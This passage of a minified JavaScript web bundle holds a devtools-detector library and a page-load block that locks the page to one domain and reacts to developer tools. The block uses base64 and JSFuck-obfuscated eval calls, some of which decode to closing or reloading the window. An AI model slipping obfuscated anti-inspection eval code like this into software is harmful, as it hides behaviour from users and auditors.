7:C=E.ops.pop(),E.trys.pop();continue;default:if(!(v=(v=E.trys).length>0&&v[v.length-1])&&(C[0]===6||C[0]===2)){E=0;continue}if(C[0]===3&&(!v||C[1]>v[0]&&C[1]<v[3])){E.label=C[1];break}if(C[0]===6&&E.label<v[1]){E.label=v[1],v=C;break}if(v&&E.label<v[2]){E.label=v[2],E.ops.push(C);break}v[2]&&E.ops.pop(),E.trys.pop();continue}C=m.call(f,E)}catch(R){C=[6,R],y=0}finally{g=v=0}if(5&C[0])throw C[1];return{value:C[0]?C[1]:void 0,done:!0}}([w,k])}}},u={name:"debugger-checker",isOpen:function(){return l(this,void 0,void 0,function(){var f;return d(this,function(m){return f=Object(o.c)(),(function(){}).constructor("debugger")(),[2,Object(o.c)()-f>100]})})},isEnable:function(){return l(this,void 0,void 0,function(){return d(this,function(f){return[2,!0]})})}}},function(n,s,r){r.d(s,"a",function(){return v});var o=r(0),l=r(2),d=r(1),u=r(3),f=this&&this.__awaiter||function(x,E,S,w){return new(S||(S=Promise))(function(k,C){function R(I){try{O(w.next(I))}catch(A){C(A)}}function L(I){try{O(w.throw(I))}catch(A){C(A)}}function O(I){I.done?k(I.value):function(A){return A instanceof S?A:new S(function(j){j(A)})}(I.value).then(R,L)}O((w=w.apply(x,E||[])).next())})},m=this&&this.__generator||function(x,E){var S,w,k,C,R={label:0,sent:function(){if(1&k[0])throw k[1];return k[1]},trys:[],ops:[]};return C={next:L(0),throw:L(1),return:L(2)},typeof Symbol=="function"&&(C[Symbol.iterator]=function(){return this}),C;function L(O){return function(I){return function(A){if(S)throw new TypeError("Generator is already executing.");for(;R;)try{if(S=1,w&&(k=2&A[0]?w.return:A[0]?w.throw||((k=w.return)&&k.call(w),0):w.next)&&!(k=k.call(w,A[1])).done)return k;switch(w=0,k&&(A=[2&A[0],k.value]),A[0]){case 0:case 1:k=A;break;case 4:return R.label++,{value:A[1],done:!1};case 5:R.label++,w=A[1],A=[0];continue;case 7:A=R.ops.pop(),R.trys.pop();continue;default:if(!(k=(k=R.trys).length>0&&k[k.length-1])&&(A[0]===6||A[0]===2)){R=0;continue}if(A[0]===3&&(!k||A[1]>k[0]&&A[1]<k[3])){R.label=A[1];break}if(A[0]===6&&R.label<k[1]){R.label=k[1],k=A;break}if(k&&R.label<k[2]){R.label=k[2],R.ops.push(A);break}k[2]&&R.ops.pop(),R.trys.pop();continue}A=E.call(x,R)}catch(j){A=[6,j],w=0}finally{S=k=0}if(5&A[0])throw A[1];return{value:A[0]?A[1]:void 0,done:!0}}([O,I])}}},g=new Date,y=0;g.toString=function(){return y++,""};var v={name:"date-to-string",isOpen:function(){return f(this,void 0,void 0,function(){return m(this,function(x){return y=0,Object(l.b)(g),Object(l.a)(),[2,y===2]})})},isEnable:function(){return f(this,void 0,void 0,function(){return m(this,function(x){return[2,Object(d.b)({includes:[o.c],excludes:[(u.isIpad||u.isIphone)&&o.c]})]})})}}},function(n,s,r){r.d(s,"a",function(){return y});var o=r(0),l=r(2),d=r(1),u=this&&this.__awaiter||function(v,x,E,S){return new(E||(E=Promise))(function(w,k){function C(O){try{L(S.next(O))}catch(I){k(I)}}function R(O){try{L(S.throw(O))}catch(I){k(I)}}function L(O){O.done?w(O.value):function(I){return I instanceof E?I:new E(function(A){A(I)})}(O.value).then(C,R)}L((S=S.apply(v,x||[])).next())})},f=this&&this.__generator||function(v,x){var E,S,w,k,C={label:0,sent:function(){if(1&w[0])throw w[1];return w[1]},trys:[],ops:[]};return k={next:R(0),throw:R(1),return:R(2)},typeof Symbol=="function"&&(k[Symbol.iterator]=function(){return this}),k;function R(L){return function(O){return function(I){if(E)throw new TypeError("Generator is already executing.");for(;C;)try{if(E=1,S&&(w=2&I[0]?S.return:I[0]?S.throw||((w=S.return)&&w.call(S),0):S.next)&&!(w=w.call(S,I[1])).done)return w;switch(S=0,w&&(I=[2&I[0],w.value]),I[0]){case 0:case 1:w=I;break;case 4:return C.label++,{value:I[1],done:!1};case 5:C.label++,S=I[1],I=[0];continue;case 7:I=C.ops.pop(),C.trys.pop();continue;default:if(!(w=(w=C.trys).length>0&&w[w.length-1])&&(I[0]===6||I[0]===2)){C=0;continue}if(I[0]===3&&(!w||I[1]>w[0]&&I[1]<w[3])){C.label=I[1];break}if(I[0]===6&&C.label<w[1]){C.label=w[1],w=I;break}if(w&&C.label<w[2]){C.label=w[2],C.ops.push(I);break}w[2]&&C.ops.pop(),C.trys.pop();continue}I=x.call(v,C)}catch(A){I=[6,A],S=0}finally{E=w=0}if(5&I[0])throw I[1];return{value:I[0]?I[1]:void 0,done:!0}}([L,O])}}},m=null,g=0,y={name:"performance",isOpen:function(){return u(this,void 0,void 0,function(){var v,x;return f(this,function(E){return m===null&&(m=function(){for(var S=function(){for(var C={},R=0;R<500;R++)C["".concat(R)]="".concat(R);return C}(),w=[],k=0;k<50;k++)w.push(S);return w}()),v=function(){var S=Object(d.c)();return Object(l.c)(m),Object(d.c)()-S}(),x=function(){var S=Object(d.c)();return Object(l.b)(m),Object(d.c)()-S}(),g=Math.max(g,x),Object(l.a)(),v===0?[2,!1]:g===0?[2,!1]:[2,v>10*g]})})},isEnable:function(){return u(this,void 0,void 0,function(){return f(this,function(v){return[2,Object(d.b)({includes:[o.c],excludes:[]})]})})}}},function(n,s,r){r.d(s,"a",function(){return d});var o=this&&this.__awaiter||function(u,f,m,g){return new(m||(m=Promise))(function(y,v){function x(w){try{S(g.next(w))}catch(k){v(k)}}function E(w){try{S(g.throw(w))}catch(k){v(k)}}function S(w){w.done?y(w.value):function(k){return k instanceof m?k:new m(function(C){C(k)})}(w.value).then(x,E)}S((g=g.apply(u,f||[])).next())})},l=this&&this.__generator||function(u,f){var m,g,y,v,x={label:0,sent:function(){if(1&y[0])throw y[1];return y[1]},trys:[],ops:[]};return v={next:E(0),throw:E(1),return:E(2)},typeof Symbol=="function"&&(v[Symbol.iterator]=function(){return this}),v;function E(S){return function(w){return function(k){if(m)throw new TypeError("Generator is already executing.");for(;x;)try{if(m=1,g&&(y=2&k[0]?g.return:k[0]?g.throw||((y=g.return)&&y.call(g),0):g.next)&&!(y=y.call(g,k[1])).done)return y;switch(g=0,y&&(k=[2&k[0],y.value]),k[0]){case 0:case 1:y=k;break;case 4:return x.label++,{value:k[1],done:!1};case 5:x.label++,g=k[1],k=[0];continue;case 7:k=x.ops.pop(),x.trys.pop();continue;default:if(!(y=(y=x.trys).length>0&&y[y.length-1])&&(k[0]===6||k[0]===2)){x=0;continue}if(k[0]===3&&(!y||k[1]>y[0]&&k[1]<y[3])){x.label=k[1];break}if(k[0]===6&&x.label<y[1]){x.label=y[1],y=k;break}if(y&&x.label<y[2]){x.label=y[2],x.ops.push(k);break}y[2]&&x.ops.pop(),x.trys.pop();continue}k=f.call(u,x)}catch(C){k=[6,C],g=0}finally{m=y=0}if(5&k[0])throw k[1];return{value:k[0]?k[1]:void 0,done:!0}}([S,w])}}},d={name:"eruda",isOpen:function(){var u;return o(this,void 0,void 0,function(){return l(this,function(f){return typeof eruda<"u"?[2,((u=eruda==null?void 0:eruda._devTools)===null||u===void 0?void 0:u._isShow)===!0]:[2,!1]})})},isEnable:function(){return o(this,void 0,void 0,function(){return l(this,function(u){return[2,!0]})})}}}])})})(devtoolsDetector);var devtoolsDetectorExports=devtoolsDetector.exports;const[a,b]=[devtoolsDetectorExports.addListener,devtoolsDetectorExports.launch];({}).VITE_FORBID_DEV&&function(){btoa(location.host)!==atob("Ykc5allXeG9iM04wT2pFME5ETT0=")&&window[atob("ZXZhbA==")](window[atob("YXRvYg==")]("d2luZG93W2F0b2IoIlkyeHZjMlU9IildKCkgfHwgd2luZG93W2F0b2IoImJHOWpZWFJwYjI0PSIpXVthdG9iKCJjbVZzYjJGayIpXSgp")),a(c=>eval([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+([][[]]+[])[!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())),b()}();const Utils$1={copyText(){const e=this,t=e instanceof HTMLElement,n=e instanceof HTMLInputElement,s=e instanceof HTMLTextAreaElement;let r="";if(n||s)e.focus(),e.select(),r=e.value;else if(t){const o=self.getSelection(),l=document.createRange();l.selectNodeContents(e),o.removeAllRanges(),o.addRange(l),r=e.textContent}else return Promise.reject();return navigator.clipboard?navigator.clipboard.writeText(r):Promise[document.execCommand("copy")?"resolve":"reject"]()},setText(e=""){const t=this,n=t instanceof HTMLElement,s=t instanceof HTMLInputElement,r=t instanceof HTMLTextAreaElement;if(s||r)t.value=e;else if(n)t.textContent=e;else return Promise.reject();return Promise.resolve()},cnymd(e){const t=new 